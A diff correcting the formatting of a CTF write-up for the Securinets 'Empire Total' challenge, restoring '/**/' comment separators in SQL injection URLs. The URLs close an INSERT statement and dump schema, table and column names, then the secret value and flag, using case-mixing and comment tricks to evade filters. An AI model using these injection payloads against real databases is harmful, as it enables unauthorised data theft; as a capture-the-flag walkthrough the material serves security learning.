@@ -721,7 +721,7 @@ we will find that the url we scanned in VirusTotal website will appear , it&rsqu
 <a href="https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/Empire%20Total/test.py" target="_blank" rel="noopener">HERE</a></strong></p>
 <p>Finally I opted to this solution, here is the URL we will scan :</p>
 <blockquote>
-<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/1),(select/</strong>/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
+<p>http://100.26.206.184/?u=&rsquo;,(select/**/1),(select/**/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
 </blockquote>
 <p>The complete SQL query that will be executed is  :</p>
 <blockquote>
@@ -738,7 +738,7 @@ we will find that the url we scanned in VirusTotal website will appear , it&rsqu
 <li>Dump DB names :</li>
 </ol>
 <blockquote>
-<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/gRoUp_cOncaT(0x7c,schema_name,0x7c)/</strong>/fRoM/<strong>/information_schema.schemata),(select/</strong>/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
+<p>http://100.26.206.184/?u=&rsquo;,(select/**/gRoUp_cOncaT(0x7c,schema_name,0x7c)/**/fRoM/**/information_schema.schemata),(select/**/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
 </blockquote>
 <p><img src="https://imgur.com/AJvdMXB.png" alt="TASK"></p>
 <p>DBName : MySecretDatabase</p>
@@ -746,10 +746,10 @@ we will find that the url we scanned in VirusTotal website will appear , it&rsqu
 <li>Dump Tables and Columns :</li>
 </ol>
 <blockquote>
-<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/gRoUp_cOncaT(0x7c,table_name,0x7c)/</strong>/fRoM/<strong>/information_schema.tables),(select/</strong>/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
+<p>http://100.26.206.184/?u=&rsquo;,(select/**/gRoUp_cOncaT(0x7c,table_name,0x7c)/**/fRoM/**/information_schema.tables),(select/**/2)),(&lsquo;102&rsquo;,&lsquo;a</p>
 </blockquote>
 <blockquote>
-<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/gRoUp_cOncaT(0x7c,column_name,0x7c)/</strong>/fRoM/<strong>/information_schema.columns),(select/</strong>/2)),(&lsquo;103&rsquo;,&lsquo;a</p>
+<p>http://100.26.206.184/?u=&rsquo;,(select/**/gRoUp_cOncaT(0x7c,column_name,0x7c)/**/fRoM/**/information_schema.columns),(select/**/2)),(&lsquo;103&rsquo;,&lsquo;a</p>
 </blockquote>
 <p><img src="https://imgur.com/raYuUmI.png" alt="TASK"></p>
 <p><strong>Table Name</strong> : SecretTable &amp; <strong>Column Name</strong> : secret_value</p>
@@ -757,7 +757,7 @@ we will find that the url we scanned in VirusTotal website will appear , it&rsqu
 <li>And finally let&rsquo;s have our beloved flag :</li>
 </ol>
 <blockquote>
-<p>http://100.26.206.184/?u=&rsquo;,(select/<strong>/group_concat(0x7c,secret_value,0x7c)/</strong>/fRoM/<strong>/MySecretDatabase.SecretTable),(select/</strong>/2)),(&lsquo;109&rsquo;,&lsquo;a</p>
+<p>http://100.26.206.184/?u=&rsquo;,(select/**/group_concat(0x7c,secret_value,0x7c)/**/fRoM/**/MySecretDatabase.SecretTable),(select/**/2)),(&lsquo;109&rsquo;,&lsquo;a</p>
 </blockquote>
 <p><img src="https://imgur.com/FanWbUZ.png" alt="TASK"></p>
 <p>Yees We did it , <strong>FLAG</strong> : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}</p>
